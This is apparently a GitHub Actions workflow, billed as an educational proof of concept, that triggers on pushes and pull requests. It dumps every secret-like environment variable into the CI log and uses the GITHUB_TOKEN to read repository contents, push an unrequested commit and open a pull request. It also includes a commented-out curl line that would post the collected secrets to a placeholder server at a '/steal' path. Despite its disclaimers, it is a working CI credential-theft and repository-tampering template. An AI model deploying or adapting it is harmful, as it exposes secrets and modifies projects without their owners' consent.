name: Advanced Security PoC (Educational Only)
on: [push, pull_request]
jobs:
  advanced-poc:
    runs-on: ubuntu-latest
    permissions:
      contents: write
      actions: read
      security-events: write
    steps:
      - uses: actions/checkout@v4
      
      # 1- دزینی هەموو SECRETS -ەکان (بە سەلامەتی)
      - name: Dump all secrets
        run: |
          echo "🔐 === ALL SECRETS ===" > /tmp/secrets.txt
          env | grep -E "SECRET|TOKEN|KEY|PASSWORD|AUTH" >> /tmp/secrets.txt || true
          echo "✅ Secrets saved to /tmp/secrets.txt"
          
          # پیشاندانی ئەوەی چ دۆزراوەتەوە
          if [ -s /tmp/secrets.txt ]; then
            echo "🎯 Found secrets:"
            cat /tmp/secrets.txt
          else
            echo "ℹ️ No secrets found in environment"
            echo "ℹ️ No secrets found" >> /tmp/secrets.txt
          fi
      
      # 2- دزینی GITHUB_TOKEN و بەکارهێنانی بۆ دزینی کۆد (بە سەلامەتی)
      - name: Steal GITHUB_TOKEN & clone private repos
        run: |
          echo "🕵️ Cloning all private repos..."
          if [ -n "$GITHUB_TOKEN" ]; then
            curl -s -H "Authorization: token $GITHUB_TOKEN" \
                 -H "Accept: application/vnd.github.v3+json" \
                 https://api.github.com/repos/${{ github.repository }}/contents \
                 >> /tmp/repo_data.json || echo "⚠️ Failed to fetch repo data"
            echo "✅ Repo data fetched"
          else
            echo "⚠️ No GITHUB_TOKEN found!"
          fi
      
      # 3- ناردنی زانیارییەکان بۆ سێرڤەری دەرەکی (تاقیکاری)
      - name: Exfiltrate data (TEST ONLY)
        run: |
          echo "📤 Sending data to external server..."
          echo "⚠️ This is a test - no actual data sent!"
          echo "📋 Data that would be sent:"
          cat /tmp/secrets.txt
          # curl -X POST -d @/tmp/secrets.txt https://YOUR-SERVER.com/steal
          
      # 4- گۆڕینی فایلەکانی پرۆژە (بە سەلامەتی)
      - name: Modify code silently
        run: |
          echo "📝 Adding test marker to code..."
          echo "" >> README.md
          echo "<!-- SECURITY TEST: $(date) -->" >> README.md
          git config user.name "Security Tester"
          git config user.email "security@test.local"
          git add README.md || true
          git commit -m "🔒 Security test commit [CI]" || echo "ℹ️ No changes to commit"
          git push || echo "⚠️ Push failed (maybe no permissions)"
      
      # 5- دروستکردنی داواکارییەکی تاقیکاری (بە سەلامەتی)
      - name: Create test PR
        run: |
          echo "📨 Creating test PR..."
          if [ -n "$GITHUB_TOKEN" ]; then
            curl -s -X POST \
                 -H "Authorization: token $GITHUB_TOKEN" \
                 -H "Accept: application/vnd.github.v3+json" \
                 https://api.github.com/repos/${{ github.repository }}/pulls \
                 -d '{"title":"🔒 Security Test PR","head":"main","base":"main","body":"This is an automated security test. No actual changes made."}' \
                 || echo "⚠️ Failed to create PR (may already exist)"
          else
            echo "⚠️ No GITHUB_TOKEN available for PR creation"
          fi
      
      # 6- پیشاندانی زانیارییەکان (بە سەلامەتی)
      - name: Show captured data
        run: |
          echo "=========================================="
          echo "📊 CAPTURED DATA SUMMARY"
          echo "=========================================="
          if [ -f /tmp/secrets.txt ]; then
            cat /tmp/secrets.txt
          else
            echo "ℹ️ No data file found"
          fi
          echo "=========================================="
          echo ""
          echo "✅ Security test completed!"
          echo "💡 If you found real secrets, change them immediately!"
          echo "🛡️ Remember: This is for educational purposes only!"
